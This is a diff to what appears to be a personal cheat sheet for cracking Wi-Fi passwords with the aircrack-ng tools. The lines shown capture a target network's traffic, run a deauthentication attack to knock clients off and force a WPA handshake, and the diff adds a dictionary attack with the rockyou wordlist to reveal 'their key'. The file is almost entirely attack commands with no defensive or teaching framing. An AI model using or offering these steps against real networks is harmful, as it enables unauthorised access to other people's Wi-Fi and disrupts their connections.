@@ -6,7 +6,8 @@ ifconfig
 airodump-ng -M wlan0mon
 airodump-ng -M wlan0mon --bssid (bssid) -c (chanel) -w (filename to save)
 
-!!!!!wait for wpa handshake
+!!!!!wait for wpa handshake or PMKID
 !!!!! run this on another terminal "aireplay-ng --deauth 10 -a <BSSID> -D wlan0"
-
-
+ ls
+aircrack-ng (filename) -w (wordlist with path ex. /home/rockyou.txt)
+!!!!!wait thier key to be revealed 
